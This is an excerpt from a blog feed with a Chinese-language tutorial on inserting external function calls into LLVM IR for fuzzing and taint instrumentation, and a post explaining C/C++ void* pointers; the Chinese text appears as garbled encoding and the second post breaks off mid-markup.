        <content type="html"><![CDATA[<h1>llvm åˆ›å»ºå¤–éƒ¨è°ƒç”¨å‡½æ•°æ–¹æ³•</h1><blockquote><p>2023-02-12 15:26:19</p><p>sizaif<br><img src="https://s2.loli.net/2022/04/16/fuSeLF4G7Kpti1Q.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/16/fuSeLF4G7Kpti1Q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p></blockquote><p>[TOC]</p><h2 id="æ³•ä¸€">æ³•ä¸€:</h2><div class="story post-story"><h3 id="å£°åå‚æ•°ç±»å‹åŠå‡½æ•°ç±»å‹">å£°åå‚æ•°ç±»å‹åŠå‡½æ•°ç±»å‹</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Fun Ty</span><span class="token keyword">static</span> FunctionType <span class="token operator">*</span>_EntryStackFnTy<span class="token punctuation">;</span><span class="token keyword">static</span> FunctionType <span class="token operator">*</span>_TaintHandleTy<span class="token punctuation">;</span><span class="token comment">// Fn</span><span class="token keyword">static</span> Function <span class="token operator">*</span>_EntryStackFn<span class="token punctuation">;</span><span class="token keyword">static</span> Function <span class="token operator">*</span>_TaintFn<span class="token punctuation">;</span>_TaintHandleTy <span class="token operator">=</span> <span class="token class-name">FunctionType</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>VoidTy<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>Int32Ty<span class="token punctuation">,</span> Int32Ty<span class="token punctuation">,</span> Int32Ty<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// trueå¯å˜å‚æ•° </span>_EntryStackFnTy <span class="token operator">=</span> <span class="token class-name">FunctionType</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>VoidTy<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>Int8PtrTy<span class="token punctuation">,</span>Int64Ty<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><blockquote><p>ç¬¬ä¸‰ä¸ªå‚æ•°<code>false</code>ï¼Œè¡¨ç¤ºæ­¤å‡½æ•°ä¸æ˜¯å¯å˜å‚æ•°, è‹¥ä¸º<code>true</code> åˆ™è¡¨æ˜å‡½æ•°æ˜¯å¯å˜å‚æ•°</p></blockquote><h3 id="åœ¨llvm-IRä¸­å¤„ç†å¹¶è°ƒç”¨å‡½æ•°">åœ¨llvm IRä¸­å¤„ç†å¹¶è°ƒç”¨å‡½æ•°:</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp">map<span class="token operator">&lt;</span>StringRef <span class="token punctuation">,</span>GlobalVariable <span class="token operator">*</span><span class="token operator">></span> fnname2gv<span class="token punctuation">;</span>IRBuilder<span class="token operator">&lt;</span><span class="token operator">></span> <span class="token operator">*</span>builder<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span>Module <span class="token operator">*</span>mod<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token generic-function"><span class="token function">IRBuilder</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>mod<span class="token operator">-></span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å£°æ˜builder</span>    Int32Ty <span class="token operator">=</span> <span class="token class-name">IntegerType</span><span class="token double-colon punctuation">::</span><span class="token function">getInt32Ty</span><span class="token punctuation">(</span>mod<span class="token operator">-></span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>Value<span class="token operator">*</span><span class="token operator">></span>vec_arg<span class="token punctuation">;</span>    StringRef fn_name <span class="token operator">=</span> func<span class="token operator">-></span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    u64 fn_name_hash <span class="token operator">=</span> <span class="token function">hash64_char</span><span class="token punctuation">(</span>fn_name<span class="token punctuation">.</span><span class="token function">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fn_name<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// hash(fn_name)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fnname2gv<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>fn_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        ArrayType <span class="token operator">*</span>ty <span class="token operator">=</span> <span class="token class-name">ArrayType</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Type</span><span class="token double-colon punctuation">::</span><span class="token function">getInt8Ty</span><span class="token punctuation">(</span>mod<span class="token operator">-></span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fn_name<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        GlobalVariable <span class="token operator">*</span>gv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">GlobalVariable</span><span class="token punctuation">(</span>            <span class="token operator">*</span>mod<span class="token punctuation">,</span> ty<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> GlobalValue<span class="token double-colon punctuation">::</span>InternalLinkage<span class="token punctuation">,</span> <span class="token keyword">nullptr</span><span class="token punctuation">,</span>            <span class="token punctuation">(</span>funcCount <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">".funcName."</span> <span class="token operator">+</span> <span class="token function">to_string</span><span class="token punctuation">(</span>funcCount<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">".funcName"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>funcCount<span class="token punctuation">;</span>        gv<span class="token operator">-></span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token function">MaybeAlign</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constant <span class="token operator">*</span>arrayValue <span class="token operator">=</span> <span class="token class-name">ConstantDataArray</span><span class="token double-colon punctuation">::</span><span class="token function">getString</span><span class="token punctuation">(</span>mod<span class="token operator">-></span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fn_name<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gv<span class="token operator">-></span><span class="token function">setInitializer</span><span class="token punctuation">(</span>arrayValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        fnname2gv<span class="token punctuation">[</span>fn_name<span class="token punctuation">]</span> <span class="token operator">=</span> gvfnname<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    vector<span class="token operator">&lt;</span>Constant <span class="token operator">*</span><span class="token operator">></span> indices<span class="token punctuation">;</span>    indices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token class-name">ConstantInt</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>Int64Ty<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    indices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token class-name">ConstantInt</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>Int64Ty<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vec_arg<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token class-name">ConstantExpr</span><span class="token double-colon punctuation">::</span><span class="token function">getGetElementPtr</span><span class="token punctuation">(</span>fnname2gv<span class="token punctuation">[</span>fn_name<span class="token punctuation">]</span><span class="token operator">-></span><span class="token function">getValueType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fnname2gv<span class="token punctuation">[</span>fn_name<span class="token punctuation">]</span><span class="token punctuation">,</span>indices<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vec_arg<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token class-name">ConstantInt</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>Int64Ty<span class="token punctuation">,</span>fn_name_hash<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    builder<span class="token operator">-></span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>inst<span class="token punctuation">)</span><span class="token punctuation">;</span>    builder<span class="token operator">-></span><span class="token function">CreateCall</span><span class="token punctuation">(</span>_EntryStackFn<span class="token punctuation">,</span>vec_arg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>1.å¯¹äºå­—ç¬¦ä¸²ç±»å‹ï¼Œæ— æ³•ç›´æ¥å°†<code>string</code> è½¬æ¢æˆ<code>Value*</code>, ä½†<code>GlobalString</code> æ˜¯<code>Value</code>ç±»å‹ï¼Œ</p><p>æ‰€ä»¥é€šè¿‡æ„å»ºå…¨å±€å˜é‡çš„å½¢å¼ï¼š <code>string</code>-&gt;<code>StringRef</code>-&gt;<code>globalString</code>-&gt;<code>Value*</code></p><p>åœ¨llvm IRä¸­ä¼ é€’å‚æ•°åº”ä½¿ç”¨<code>Value*</code></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">```<span class="token number">2.</span>å¯¹äºå¯å˜å‚æ•°å˜é‡åªéœ€è¦å…ˆå¡«å……`counts` ï¼ˆå‘ŠçŸ¥åé¢æœ‰å‡ ä¸ªå‚æ•°<span class="token punctuation">,</span>è¿™ä¸ª`counts`æ˜¯ä¸åŒ…å«åœ¨å¯å˜å‚æ•°é‡Œï¼Œéœ€è¦æ˜¾å¼å£°æ˜çš„<span class="token punctuation">)</span> <span class="token punctuation">;</span> ç„¶åå¾€`vector`é‡Œå¡«å……å³å¯ ä¾‹å¦‚ï¼š```cppstd<span class="token operator">:</span>vector<span class="token operator">&lt;</span>Value<span class="token operator">*</span><span class="token operator">></span>vec_arg<span class="token punctuation">;</span>vec_arg<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token class-name">ConstantInt</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>Int32Ty<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// counts</span>vec_arg<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token class-name">ConstantInt</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>Int32Ty<span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> vec_arg<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>fnname2gv<span class="token punctuation">[</span>fn_name<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre></blockquote><h3 id="å¤–éƒ¨å‡½æ•°ï¼š">å¤–éƒ¨å‡½æ•°ï¼š</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token keyword">void</span> <span class="token function">entrystackFunc</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>funcName<span class="token punctuation">,</span> u64 fnamehash<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token keyword">void</span> <span class="token function">_Taint_handle</span><span class="token punctuation">(</span><span class="token keyword">int</span> inst_type<span class="token punctuation">,</span> <span class="token keyword">int</span> isOrNo<span class="token punctuation">,</span> <span class="token keyword">int</span> counts<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    va_list args<span class="token punctuation">;</span>    <span class="token function">va_start</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> counts<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;</span> counts<span class="token punctuation">;</span> idx<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">auto</span> temps_va <span class="token operator">=</span> <span class="token function">va_arg</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//  void * ç±»å‹æ¥æ”¶</span>        u64 tmp <span class="token operator">=</span> <span class="token punctuation">(</span>u64<span class="token punctuation">)</span><span class="token punctuation">(</span>temps_va<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è½¬æ¢åˆ°å¯¹åº”çš„ç±»å‹</span>    <span class="token punctuation">&#125;</span>    <span class="token function">va_end</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></div><h2 id="æ³•äºŒ">æ³•äºŒ</h2><div class="story post-story"><h3 id="å£°æ˜å‡½æ•°">å£°æ˜å‡½æ•°</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp">string <span class="token function">entryFuncName</span><span class="token punctuation">(</span><span class="token string">"entryFunc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Function <span class="token operator">*</span><span class="token function">insertentryFuncDecl</span><span class="token punctuation">(</span>Module <span class="token operator">*</span>mod<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Int64Ty <span class="token operator">=</span> <span class="token class-name">IntegerType</span><span class="token double-colon punctuation">::</span><span class="token function">getInt64Ty</span><span class="token punctuation">(</span>mod<span class="token operator">-></span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FunctionCallee c <span class="token operator">=</span> mod<span class="token operator">-></span><span class="token function">getOrInsertFunction</span><span class="token punctuation">(</span>entryFuncName<span class="token punctuation">,</span> <span class="token class-name">FunctionType</span><span class="token double-colon punctuation">::</span><span class="token function">getVoidTy</span><span class="token punctuation">(</span>mod<span class="token operator">-></span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                     <span class="token class-name">Type</span><span class="token double-colon punctuation">::</span><span class="token function">getInt8PtrTy</span><span class="token punctuation">(</span>mod<span class="token operator">-></span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                     Int64Ty<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token generic-function"><span class="token function">static_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span>Function <span class="token operator">*</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">getCallee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="åœ¨llvm-IRä¸­å¤„ç†å¹¶å‡½æ•°è°ƒç”¨">åœ¨llvm IRä¸­å¤„ç†å¹¶å‡½æ•°è°ƒç”¨</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp">Function <span class="token operator">*</span>entryFunc <span class="token operator">=</span> <span class="token function">insertentryFuncDecl</span><span class="token punctuation">(</span>mod<span class="token punctuation">)</span><span class="token punctuation">;</span>std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>Value <span class="token operator">*</span><span class="token operator">></span> Args<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Args<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Instruction <span class="token operator">*</span>entryCall <span class="token operator">=</span> <span class="token class-name">CallInst</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>    entryFunc<span class="token operator">-></span><span class="token function">getFunctionType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    entryFunc<span class="token punctuation">,</span>    Args<span class="token punctuation">)</span><span class="token punctuation">;</span>entryCall<span class="token operator">-></span><span class="token function">insertBefore</span><span class="token punctuation">(</span>inst<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="å¤–éƒ¨å‡½æ•°">å¤–éƒ¨å‡½æ•°</h3><p>å¤–éƒ¨å‡½æ•°åŒæ³•ä¸€ä¸­æ‰€æŒ‡</p></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> LLVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
            <tag> LLVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++ Void*çš„ç†è§£</title>
      <link href="/posts/820cea1e/"/>
      <url>/posts/820cea1e/</url>
      
        <content type="html"><![CDATA[<h1>C/C++ä¸­Void *çš„ç†è§£</h1><blockquote><p>2022-11-06 16:44:35</p><p>éƒ¨åˆ†å†…å®¹æ¥è‡ª <a href="https://blog.csdn.net/W_H_M_2018/article/details/111120624">C++ä¸­çš„void*ç†è§£</a></p></blockquote><h2 id="1-void-æ˜¯ä»€ä¹ˆï¼Ÿ"><strong>1. void *æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h2><div class="story post-story"><p>è¯­è¨€ä¸­ï¼Œ*ç±»å‹å°±æ˜¯æŒ‡é’ˆç±»å‹ã€‚æ¯”å¦‚ int *pï¼Œdouble <em>qï¼Œè™½ç„¶æ˜¯ä¸ä¸€æ ·çš„æŒ‡é’ˆï¼Œä½†æ˜¯å¤§å°å´ä¸€æ ·sizeofÂ§ == sizeof(q)ï¼Œå…¶å®å¾ˆå®¹æ˜“ç†è§£ï¼Œå› ä¸ºä»–ä»¬éƒ½æ˜¯åŒä¸€ç§ç±»å‹</em>ç±»å‹çš„ã€‚Cè¯­è¨€æ˜¯å¼ºç±»å‹çš„è¯­è¨€ã€‚å¯¹ç±»å‹çš„åŒºåˆ†ååˆ†ä¸¥æ ¼ã€‚é‚£è¿™ä¸¤ä¸ªæœ‰ä»€ä¹ˆä¸åŒç‚¹å—ï¼Ÿæœ‰ï¼Œ+1å°±ä¸åŒäº†ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/11/07/uTvxpFVm6OzLB24.png" class="lazyload" data-srcset="https://s2.loli.net/2022/11/07/uTvxpFVm6OzLB24.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="b0c4a1d07ca401008676cb3ca8d7c98c"></p><p>ä¹Ÿå°±æ˜¯å¯¹äºä¸€ä¸ªæŒ‡é’ˆè€Œè¨€ï¼Œå¦‚æœæˆ‘ä»¬åœ¨å‰é¢è§„å®šäº†å®ƒçš„ç±»å‹ã€‚é‚£å°±ç›¸å½“äºå†³å®šäº†å®ƒçš„â€œè·³è·ƒåŠ›â€ã€‚â€œè·³è·ƒåŠ›â€å°±æ¯”å¦‚è¯´ä¸Šé¢å›¾ä¸­intè·³äº†4ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯doubleè·³äº†8ä¸ªå­—èŠ‚ã€‚</p><p>åŸºäºè¿™æ ·çš„ç†è§£ï¼Œæˆ‘è¦å¯¹void *ä¸‹å®šä¹‰äº†ï¼š<strong>void * æ˜¯ä¸€ä¸ªè·³è·ƒåŠ›æœªå®šçš„æŒ‡é’ˆ</strong></p></div><h2 id="2-void-è¯¦è§£">2. void*è¯¦è§£</h2><div class="story post-story"><h3 id="2-1-voidå¯ä»¥æŒ‡å‘ä»»ä½•ç±»å‹çš„åœ°å€ï¼Œä½†æ˜¯å¸¦ç±»å‹çš„æŒ‡é’ˆä¸èƒ½æŒ‡å‘voidçš„åœ°å€">2.1 void<em>å¯ä»¥æŒ‡å‘ä»»ä½•ç±»å‹çš„åœ°å€ï¼Œä½†æ˜¯å¸¦ç±»å‹çš„æŒ‡é’ˆä¸èƒ½æŒ‡å‘void</em>çš„åœ°å€</h3><p>æ­£å¸¸æ¥è¯´å¦‚æœä¸¤ä¸ªæŒ‡é’ˆç±»å‹ä¸ä¸€æ ·çš„è¯ï¼Œä¸¤ä¸ªæŒ‡é’ˆå˜é‡æ˜¯ä¸å¯ä»¥ç›´æ¥ç›¸ç­‰çš„ã€‚ä¾‹å¦‚int* a, float* bï¼Œå‡å¦‚ä»¤a = bï¼Œä¼šç›´æ¥å‘ç”Ÿç¼–è¯‘é”™è¯¯ï¼Œè€Œvoid<em>æŒ‡é’ˆå¯ä»¥ç­‰äºä»»ä½•ç±»å‹çš„æŒ‡é’ˆã€‚ä½†æ˜¯åè¿‡æ¥ä¸å¯ä»¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªæœ‰ç±»å‹çš„æŒ‡é’ˆä¸èƒ½æŒ‡å‘ä¸€ä¸ªvoid</em>ç±»å‹çš„å˜é‡ï¼ˆå“ªæ€•æ­¤æ—¶void*å˜é‡å·²ç»æŒ‡å‘äº†ä¸€ä¸ªæœ‰ç±»å‹çš„åœ°å€ï¼‰ã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">float</span> f <span class="token operator">=</span> <span class="token number">5.5</span><span class="token punctuation">;</span><span class="token keyword">float</span><span class="token operator">*</span> pf <span class="token operator">=</span> <span class="token operator">&amp;</span>f<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token operator">*</span> pv <span class="token operator">=</span> pf<span class="token punctuation">;</span><span class="token keyword">float</span><span class="token operator">*</span> pf2 <span class="token operator">=</span> pv<span class="token punctuation">;</span><span class="token comment">//ç¼–è¯‘é”™è¯¯ï¼Œæœ‰ç±»å‹çš„æŒ‡é’ˆå˜é‡ä¸èƒ½æŒ‡å‘void*å˜é‡</span></code></pre><h3 id="2-2-void-æŒ‡é’ˆåªæœ‰å¼ºåˆ¶ç±»å‹è½¬æ¢ä»¥åæ‰å¯ä»¥æ­£å¸¸å–å€¼">2.2 void*æŒ‡é’ˆåªæœ‰å¼ºåˆ¶ç±»å‹è½¬æ¢ä»¥åæ‰å¯ä»¥æ­£å¸¸å–å€¼</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">float</span> f <span class="token operator">=</span> <span class="token number">5.5</span><span class="token punctuation">;</span>    <span class="token keyword">float</span><span class="token operator">*</span> pf <span class="token operator">=</span> <span class="token operator">&amp;</span>f<span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> pv<span class="token punctuation">;</span>    pv <span class="token operator">=</span> pf<span class="token punctuation">;</span> <span class="token comment">//è¿™å¥æ˜¯å¯ä»¥çš„</span>        cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span>pv<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token comment">//ç¼–è¯‘é”™è¯¯ï¼Œè¿™æ ·ç›´æ¥å¯¹pvå–å€¼æ˜¯é”™è¯¯çš„</span>    cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token operator">*</span><span class="token punctuation">)</span>pv<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token comment">//å¼ºåˆ¶ç±»å‹è½¬æ¢åå¯ä»¥å–å€¼</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>åœ¨ä»¤pv = pfåï¼Œæ­¤æ—¶pvå’ŒpfæŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªåœ°å€ï¼Œå€¼ç›¸åŒï¼Œä½†æ˜¯ä¸¤è€…çš„ç±»å‹æ˜¯ä¸ä¸€æ ·çš„ã€‚pfä½œä¸ºæµ®ç‚¹å‹æŒ‡é’ˆï¼Œæ˜¯å¯ä»¥ç›´æ¥å–åˆ°æµ®ç‚¹æ•°çš„ï¼Œ<strong>ä½†æ˜¯pvå¿…é¡»è¦å¼ºåˆ¶ç±»å‹è½¬æ¢ä»¥åæ‰å¯ä»¥å–å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªvoid*çš„æŒ‡é’ˆå¿…é¡»è¦ç»è¿‡å¼ºåˆ¶ç±»å‹è½¬æ¢ä»¥åæ‰æœ‰æ„ä¹‰ã€‚</strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">float</span> f <span class="token operator">=</span> <span class="token number">5.5</span><span class="token punctuation">;</span>    <span class="token keyword">float</span><span class="token operator">*</span> pf <span class="token operator">=</span> <span class="token operator">&amp;</span>f<span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> pv<span class="token punctuation">;</span>    pv <span class="token operator">=</span> pf<span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token operator">*</span><span class="token punctuation">)</span>pv<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token comment">//å¼ºåˆ¶ç±»å‹è½¬æ¢åå¯ä»¥å–å€¼,å€¼ä¸º5.5</span>    cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>pv<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">//å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œå€¼ä¸º1085276160</span>    cout<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token operator">*</span><span class="token punctuation">)</span>pv<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token comment">//å–å€¼åå†æ¬¡ç±»å‹è½¬æ¢ï¼Œå€¼ä¸º5</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¦‚æœæŠŠä¸€ä¸ªæŒ‡å‘float<em>çš„å€¼çš„void</em>æŒ‡é’ˆï¼Œå¼ºåˆ¶è½¬æ¢æˆint*ä¹Ÿæ˜¯ä¸å¯¹çš„ã€‚ä¹Ÿå°±æ˜¯è¯´åœ°å€<strong>ä¿å­˜äº†ä»€ä¹ˆæ ·çš„å˜é‡ï¼Œå°±è¦è½¬åŒ–æˆå“ªç§ç±»å‹çš„æŒ‡é’ˆ</strong>ï¼Œå¦åˆ™å°±ä¼šå‡ºé”™ã€‚</p><h3 id="2-3-void-æŒ‡é’ˆå˜é‡å’Œæ™®é€šæŒ‡é’ˆä¸€æ ·å¯ä»¥é€šè¿‡ç­‰äº0æˆ–è€…NULLæ¥åˆå§‹åŒ–ï¼Œè¡¨ç¤ºä¸€ä¸ªç©ºæŒ‡é’ˆ">2.3 void*æŒ‡é’ˆå˜é‡å’Œæ™®é€šæŒ‡é’ˆä¸€æ ·å¯ä»¥é€šè¿‡ç­‰äº0æˆ–è€…NULLæ¥åˆå§‹åŒ–ï¼Œè¡¨ç¤ºä¸€ä¸ªç©ºæŒ‡é’ˆ</h3><pre class="language-cpp" 